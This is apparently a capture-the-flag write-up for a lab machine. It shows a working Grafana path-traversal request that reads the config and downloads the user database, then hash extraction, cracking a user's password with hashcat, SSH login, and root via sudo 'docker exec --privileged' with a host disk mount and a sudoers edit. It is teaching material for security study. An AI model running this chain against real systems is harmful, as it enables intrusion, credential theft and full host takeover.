# limit number of dashboards per Org.
; org_dashboard = 100

# limit number of data_sources per Org.
; org_data_source = 10

# limit number of api_keys per Org.
; org_api_key = 10

# limit number of alerts per Org.
;org_alert_rule = 100

# limit number of orgs a user can create.
; user_org = 10

# Global limit of users.
; global_user = -1

# global limit of orgs.
; global_org = -1

# global limit of dashboards
; global_dashboard = -1

# global limit of api_keys
; global_api_key = -1

# global limit on number of logged in users.
; global_session = -1

# global limit of alerts
;global_alert_rule = -1

#################################### Alerting ############################
[alerting]
# Disable alerting engine & UI features
;enabled = true
# Makes it possible to turn off alert rule execution but alerting UI is visible
;execute_alerts = true

# Default setting for new alert rules. Defaults to categorize error and timeouts as alerting. (alerting, keep_state)
;error_or_timeout = alerting

# Default setting for how Grafana handles nodata or null values in alerting. (alerting, no_data, keep_state, ok)
;nodata_or_nullvalues = no_data

# Alert notifications can include images, but rendering many images at the same time can overload the server
# This limit will protect the server from render overloading and make sure notifications are sent out quickly
;concurrent_render_limit = 5

# Default setting for alert calculation timeout. Default value is 30
;evaluation_timeout_seconds = 30

# Default setting for alert notification timeout. Default value is 30
;notification_timeout_seconds = 30

# Default setting for max attempts to sending alert notifications. Default value is 3
;max_attempts = 3

# Makes it possible to enforce a minimal interval between evaluations, to reduce load on the backend
;min_interval_seconds = 1

# Configures for how long alert annotations are stored. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_annotation_age =

# Configures max number of alert annotations that Grafana stores. Default value is 0, which keeps all alert annotations.
;max_annotations_to_keep =

#################################### Annotations #########################
[annotations]
# Configures the batch size for the annotation clean-up job. This setting is used for dashboard, API, and alert annotations.
;cleanupjob_batchsize = 100

[annotations.dashboard]
# Dashboard annotations means that annotations are associated with the dashboard they are created on.

# Configures how long dashboard annotations are stored. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =

# Configures max number of dashboard annotations that Grafana stores. Default value is 0, which keeps all dashboard annotations.
;max_annotations_to_keep =

[annotations.api]
# API annotations means that the annotations have been created using the API without any
# association with a dashboard.

# Configures how long Grafana stores API annotations. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =

# Configures max number of API annotations that Grafana keeps. Default value is 0, which keeps all API annotations.
;max_annotations_to_keep =

#################################### Explore #############################
[explore]
# Enable the Explore section
;enabled = true

#################################### Internal Grafana Metrics ##########################
# Metrics available at HTTP API Url /metrics
[metrics]
# Disable / Enable internal metrics
;enabled           = true
# Graphite Publish interval
;interval_seconds  = 10
# Disable total stats (stat_totals_*) metrics to be generated
;disable_total_stats = false

#If both are set, basic auth will be required for the metrics endpoint.
; basic_auth_username =
; basic_auth_password =

# Metrics environment info adds dimensions to the `grafana_environment_info` metric, which
# can expose more information about the Grafana instance.
[metrics.environment_info]
#exampleLabel1 = exampleValue1
#exampleLabel2 = exampleValue2

# Send internal metrics to Graphite
[metrics.graphite]
# Enable by setting the address setting (ex localhost:2003)
;address =
;prefix = prod.grafana.%(instance_name)s.

#################################### Grafana.com integration  ##########################
# Url used to import dashboards directly from Grafana.com
[grafana_com]
;url = https://grafana.com

#################################### Distributed tracing ############
[tracing.jaeger]
# Enable by setting the address sending traces to jaeger (ex localhost:6831)
;address = localhost:6831
# Tag that will always be included in when creating new spans. ex (tag1:value1,tag2:value2)
;always_included_tag = tag1:value1
# Type specifies the type of the sampler: const, probabilistic, rateLimiting, or remote
;sampler_type = const
# jaeger samplerconfig param
# for "const" sampler, 0 or 1 for always false/true respectively
# for "probabilistic" sampler, a probability between 0 and 1
# for "rateLimiting" sampler, the number of spans per second
# for "remote" sampler, param is the same as for "probabilistic"
# and indicates the initial sampling rate before the actual one
# is received from the mothership
;sampler_param = 1
# sampling_server_url is the URL of a sampling manager providing a sampling strategy.
;sampling_server_url =
# Whether or not to use Zipkin propagation (x-b3- HTTP headers).
;zipkin_propagation = false
# Setting this to true disables shared RPC spans.
# Not disabling is the most common setting when using Zipkin elsewhere in your infrastructure.
;disable_shared_zipkin_spans = false

#################################### External image storage ##########################
[external_image_storage]
# Used for uploading images to public servers so they can be included in slack/email messages.
# you can choose between (s3, webdav, gcs, azure_blob, local)
;provider =

[external_image_storage.s3]
;endpoint =
;path_style_access =
;bucket =
;region =
;path =
;access_key =
;secret_key =

[external_image_storage.webdav]
;url =
;public_url =
;username =
;password =

[external_image_storage.gcs]
;key_file =
;bucket =
;path =

[external_image_storage.azure_blob]
;account_name =
;account_key =
;container_name =

[external_image_storage.local]
# does not require any configuration

[rendering]
# Options to configure a remote HTTP image rendering service, e.g. using https://github.com/grafana/grafana-image-renderer.
# URL to a remote HTTP image renderer service, e.g. http://localhost:8081/render, will enable Grafana to render panels and dashboards to PNG-images using HTTP requests to an external service.
;server_url =
# If the remote HTTP image renderer service runs on a different server than the Grafana server you may have to configure this to a URL where Grafana is reachable, e.g. http://grafana.domain/.
;callback_url =
# Concurrent render request limit affects when the /render HTTP endpoint is used. Rendering many images at the same time can overload the server,
# which this setting can help protect against by only allowing a certain amount of concurrent requests.
;concurrent_render_request_limit = 30

[panels]
# If set to true Grafana will allow script tags in text panels. Not recommended as it enable XSS vulnerabilities.
;disable_sanitize_html = false

[plugins]
;enable_alpha = false
;app_tls_skip_verify_insecure = false
# Enter a comma-separated list of plugin identifiers to identify plugins that are allowed to be loaded even if they lack a valid signature.
;allow_loading_unsigned_plugins =
# Enable or disable installing plugins directly from within Grafana.
;plugin_admin_enabled = false
;plugin_admin_external_manage_enabled = false
;plugin_catalog_url = https://grafana.com/grafana/plugins/

#################################### Grafana Live ##########################################
[live]
# max_connections to Grafana Live WebSocket endpoint per Grafana server instance. See Grafana Live docs
# if you are planning to make it higher than default 100 since this can require some OS and infrastructure
# tuning. 0 disables Live, -1 means unlimited connections.
;max_connections = 100

#################################### Grafana Image Renderer Plugin ##########################
[plugin.grafana-image-renderer]
# Instruct headless browser instance to use a default timezone when not provided by Grafana, e.g. when rendering panel image of alert.
# See ICU’s metaZones.txt (https://cs.chromium.org/chromium/src/third_party/icu/source/data/misc/metaZones.txt) for a list of supported
# timezone IDs. Fallbacks to TZ environment variable if not set.
;rendering_timezone =

# Instruct headless browser instance to use a default language when not provided by Grafana, e.g. when rendering panel image of alert.
# Please refer to the HTTP header Accept-Language to understand how to format this value, e.g. 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'.
;rendering_language =

# Instruct headless browser instance to use a default device scale factor when not provided by Grafana, e.g. when rendering panel image of alert.
# Default is 1. Using a higher value will produce more detailed images (higher DPI), but will require more disk space to store an image.
;rendering_viewport_device_scale_factor =

# Instruct headless browser instance whether to ignore HTTPS errors during navigation. Per default HTTPS errors are not ignored. Due to
# the security risk it's not recommended to ignore HTTPS errors.
;rendering_ignore_https_errors =

# Instruct headless browser instance whether to capture and log verbose information when rendering an image. Default is false and will
# only capture and log error messages. When enabled, debug messages are captured and logged as well.
# For the verbose information to be included in the Grafana server log you have to adjust the rendering log level to debug, configure
# [log].filter = rendering:debug.
;rendering_verbose_logging =

# Instruct headless browser instance whether to output its debug and error messages into running process of remote rendering service.
# Default is false. This can be useful to enable (true) when troubleshooting.
;rendering_dumpio =

# Additional arguments to pass to the headless browser instance. Default is --no-sandbox. The list of Chromium flags can be found
# here (https://peter.sh/experiments/chromium-command-line-switches/). Multiple arguments is separated with comma-character.
;rendering_args =

# You can configure the plugin to use a different browser binary instead of the pre-packaged version of Chromium.
# Please note that this is not recommended, since you may encounter problems if the installed version of Chrome/Chromium is not
# compatible with the plugin.
;rendering_chrome_bin =

# Instruct how headless browser instances are created. Default is 'default' and will create a new browser instance on each request.
# Mode 'clustered' will make sure that only a maximum of browsers/incognito pages can execute concurrently.
# Mode 'reusable' will have one browser instance and will create a new incognito page on each request.
;rendering_mode =

# When rendering_mode = clustered you can instruct how many browsers or incognito pages can execute concurrently. Default is 'browser'
# and will cluster using browser instances.
# Mode 'context' will cluster using incognito pages.
;rendering_clustering_mode =
# When rendering_mode = clustered you can define maximum number of browser instances/incognito pages that can execute concurrently..
;rendering_clustering_max_concurrency =

# Limit the maximum viewport width, height and device scale factor that can be requested.
;rendering_viewport_max_width =
;rendering_viewport_max_height =
;rendering_viewport_max_device_scale_factor =

# Change the listening host and port of the gRPC server. Default host is 127.0.0.1 and default port is 0 and will automatically assign
# a port not in use.
;grpc_host =
;grpc_port =

[enterprise]
# Path to a valid Grafana Enterprise license.jwt file
;license_path =

[feature_toggles]
# enable features, separated by spaces
;enable =

[date_formats]
# For information on what formatting patterns that are supported https://momentjs.com/docs/#/displaying/

# Default system date format used in time range picker and other places where full time is displayed
;full_date = YYYY-MM-DD HH:mm:ss

# Used by graph and other places where we only show small intervals
;interval_second = HH:mm:ss
;interval_minute = HH:mm
;interval_hour = MM/DD HH:mm
;interval_day = MM/DD
;interval_month = YYYY-MM
;interval_year = YYYY

# Experimental feature
;use_browser_locale = false

# Default timezone for user preferences. Options are 'browser' for the browser local timezone or a timezone name from IANA Time Zone database, e.g. 'UTC' or 'Europe/Amsterdam' etc.
;default_timezone = browser

[expressions]
# Enable or disable the expressions functionality.
;enabled = true

```

This is extremely long. I’ll use `grep` to remove commented lines and empty lines:

```

oxdf@hacky$ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | grep -v "^[#;\[]" | grep .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 37098  100 37098    0     0   132k      0 --:--:-- --:--:-- --:--:--  132k

```

Nothing. It’s a completely default config.

The default database is SQLite:

```

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
...[snip]...
# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

```

The file is named `grafana.db`. The `Paths` section says where:

```

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

```

I’ll download the DB file:

```

oxdf@hacky$ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  584k  100  584k    0     0   803k      0 --:--:-- --:--:-- --:--:--  803k
oxdf@hacky$ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 424, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 424

```

### Recover Password

#### Database Enumeration

There are a fair number of tables in the DB:

```

oxdf@hacky$ sqlite3 grafana.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token 

```

There are two users in the `user` table:

```

sqlite> .headers on
sqlite> select * from user;
id|version|login|email|name|password|salt|rands|company|org_id|is_admin|email_verified|theme|created|updated|help_flags1|last_seen_at|is_disabled
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0

```

#### Format Hash

Grafana stores hashes in a non-standard format. I showed in detail how to make a hash for `hashcat` in [BigBang](/2025/05/03/htb-bigbang.html#crack-hash) using [this repo](https://github.com/iamaldi/grafana2hashcat). I’ll get the username, password hash, and salt:

```

sqlite> select login,password,salt from user;
login|password|salt
admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl

```

I’ll format that into the input format of `hash,salt`:

```

7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl

```

Now the script makes a hash:

```

oxdf@hacky$ uv run grafana2hashcat.py grafana.hash_salt 

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  grafana.hash_salt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt

```

#### Crack Password

`hashcat` detects the hash format and cracks the boris hash very quickly:

```

$ hashcat grafana.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
...[snip]...

```

admin doesn’t crack.

### SSH

I can log into the website, but it’s worth checking if these creds work on the system. boris isn’t a user in the `passwd` file I read earlier, but that was in a container system and SSH seems to connect to the main host (based on TTL analysis).

It’s worth checking, and they work:

```

oxdf@hacky$ netexec ssh 10.129.234.47 -u boris -p beautiful1
SSH         10.129.234.47   22     10.129.234.47    [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
SSH         10.129.234.47   22     10.129.234.47    [+] boris:beautiful1 (Pwn3d!) Linux - Shell access!

```

I’ll connect to SSH as boris:

```

oxdf@hacky$ sshpass -p beautiful1 ssh boris@10.129.234.47
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)
...[snip]...
boris@data:~$

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

The OS matches what I predicted during initial enumeration.

I can grab `user.txt`:

```

boris@data:~$ cat user.txt
87629c0b************************

```

## Shell as root

### Enumeration

#### sudo

boris can run `docker exec` as root without a password using `sudo`:

```

boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *

```

#### Running Containers

Typically I would like running containers with `docker ps`. Unfortunately, that requires access to the Docker socket, which means root (and the `sudo` configuration doesn’t allow this):

```

boris@data:~$ docker ps
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
boris@data:~$ ls -l /var/run/docker.sock 
srw-rw---- 1 root root 0 Jun 16 01:16 /var/run/docker.sock

```

I can look at the running processes:

```

boris@data:~$ ps auxww | grep docker
root      1001  0.0  3.9 1496232 79728 ?       Ssl  01:15   0:12 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1246  0.2  2.1 1351056 44512 ?       Ssl  01:16   1:31 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1494  0.0  0.1 1226188 3224 ?        Sl   01:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1499  0.0  0.1 1153864 3288 ?        Sl   01:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1517  0.0  0.4 712608  8140 ?        Sl   01:16   0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1537  0.0  3.1 776296 63052 ?        Ssl  01:16   0:31 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris    28600  0.0  0.0  14860  1008 pts/0    S+   13:10   0:00 grep --color=auto docker

```

There’s an ID for a running container, e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81.

#### Devices

I’ll take a look at the mounted hardware on the host system:

```

boris@data:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=24,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13696)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
configfs on /sys/kernel/config type configfs (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
/var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
nsfs on /run/snapd/ns/docker.mnt type nsfs (rw)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=203116k,mode=700,uid=1001,gid=1001)

```

Most interesting to me is that `/dev/sda1` is mounted as `/`. I’ll need this shortly.

#### docker exec

The `docker exec` subcommand takes a container and a command, and has several options:

```

boris@data:~$ docker exec -h
Flag shorthand -h has been deprecated, please use --help

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container

Options:
  -d, --detach               Detached mode: run command in the background
      --detach-keys string   Override the key sequence for detaching a container
  -e, --env list             Set environment variables
      --env-file list        Read in a file of environment variables
  -i, --interactive          Keep STDIN open even if not attached
      --privileged           Give extended privileges to the command
  -t, --tty                  Allocate a pseudo-TTY
  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])
  -w, --workdir string       Working directory inside the container

```

I regularly run `docker exec -it <container name> bash` to get a shell in a running container on my system.

### Host Filesystem Access

The interesting option is `--privileged`. This will allow the resulting command to access raw hardware devices from within the container. I’ll use it and get a shell:

```

boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
bash-5.1#

```

I’ve also given `--user root` to be the root user inside the container.

I’ll mount `/dev/sda1` onto a directory in the container. `/mnt` is there and empty, so I’ll use that:

```

bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# ls /mnt/
bin             home            lib64           opt             sbin            tmp             vmlinuz.old
boot            initrd.img      lost+found      proc            snap            usr
dev             initrd.img.old  media           root            srv             var
etc             lib             mnt             run             sys             vmlinuz

```

The host filesystem is now available inside the container! I can read the flag:

```

bash-5.1# cat /mnt/root/root.txt
d5a19473************************

```

### Shell

There are a lot of ways to get a root shell with full access to the filesystem. I’ll open `/mnt/etc/sudoers` and add a line at the bottom:

```

bash-5.1# tail -2 /mnt/etc/sudoers
boris ALL = (root) NOPASSWD: /snap/bin/docker exec *
boris ALL = (root) NOPASSWD: /bin/bash

```

Now back on the host system, boris can run `bash` as root:

```

boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
    (root) NOPASSWD: /bin/bash

```

From there getting a shell is trivial:

```

boris@data:~$ sudo bash
root@data:~# id
uid=0(root) gid=0(root) groups=0(root)

```